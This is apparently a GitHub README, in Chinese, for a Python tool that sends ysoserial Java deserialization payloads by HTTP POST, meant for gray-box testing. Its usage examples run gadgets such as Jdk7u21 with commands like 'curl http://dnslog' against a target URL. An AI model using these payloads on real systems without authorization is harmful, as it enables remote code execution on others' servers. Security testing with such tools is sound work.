# SerializeVulTest


在一次灰盒测试时发现burp发POST请求时不能正确的传输序列化过后的ysoserial的payload。

参考并修改了weblogic.py，通过http post方式发送ysoserial的payload  

旨在方便测试存在反序列化的点  
```
usage: SerializeVulTest.py [-h] -u URL [-j JAR] [-g GADGET] [-c COMMAND] [-m MODUL] [-f FILEPATH]

SerialVulTest

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Vul URL
  -j JAR, --jar JAR     The local Ysoserial.jar Path
  -g GADGET, --gadget GADGET
                        Ysoserial.jar Gadget, Example: URLDNS or Jdk7u21 ...
  -c COMMAND, --command COMMAND
                        Ysoserial Command, Example: http://xxxx.dnslog.cn or curl http://xxxx.dnslog.cn ...
  -m MODUL, --modul MODUL
                        1、ser：poc以读取序列化文件数据形式发送；2、cmdl：命令行模式，命令行发送序列化poc。默认为命令行模式
  -f FILEPATH, --filepath FILEPATH
                        Serialize Payload File Path: /User/xxxx/Desktop/xxx.ser
                        
  Example：
  1: python3 SerializeVulTest.py -u "http://ip:port/route" -j ysoserial.jar -g Jdk7u21 -c "curl http://dnslog"
  2: python3 SerializeVulTest.py -u "http://ip:port/route" -j ysoserial.jar -g URLDNS -c http://dnslog
  3: python3 SerializeVulTest.py -m ser -u "http://ip:port/route" -f ./test.ser
``` 
  
2021-08-26-14:54更新  
1、添加：可指定ser文件，以读取序列化文件数据通过POST请求发送（需指定-m参数值为ser，-f参数值为ser文件路径）  
2、添加提示信息   
3、添加header头"Content-Type":"application/x-java-serialized-object"，发送POST数据时以该header发送
  
![image](https://user-images.githubusercontent.com/63454826/130916984-5ac0908d-f39d-4ea6-a380-1bf0ac7ba8d8.png)
